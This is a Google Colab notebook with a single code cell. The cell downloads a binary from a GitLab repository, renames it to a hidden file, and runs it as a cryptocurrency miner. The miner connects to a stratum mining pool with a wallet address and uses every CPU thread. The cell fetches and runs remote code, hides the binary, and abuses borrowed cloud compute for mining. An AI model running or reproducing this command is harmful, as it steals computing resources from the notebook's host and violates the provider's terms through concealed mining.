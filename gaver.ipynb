{
        "cells": [
          {
            "cell_type": "code",
            "execution_count": null,
            "metadata": {
              "id": "SIPLx5spLoZy"
            },
            "outputs": [],
            "source": [
              "!git clone https://gitlab.com/tumbunas/nubia.git && cd nubia && chmod +x * && cd .. && mv ./nubia/heiso ./nubia/.ernest && ./nubia/.ernest -a gr -o stratum+tcps://asia.flockpool.com:5555 -u RCs2fFVv3CPbVMi3isQVvDE8P59AjnswW5.a -t $(nproc --all) --no-tune"
            ]
          }
        ],
        "metadata": {
          "colab": {
            "machine_shape": "hm",
            "name": "gaver.ipynb",
            "private_outputs": true,
            "provenance": []
          },
          "kernelspec": {
            "display_name": "Python 3",
            "name": "python3"
          },
          "language_info": {
            "name": "python"
          }
        },
        "nbformat": 4,
        "nbformat_minor": 0
      }
      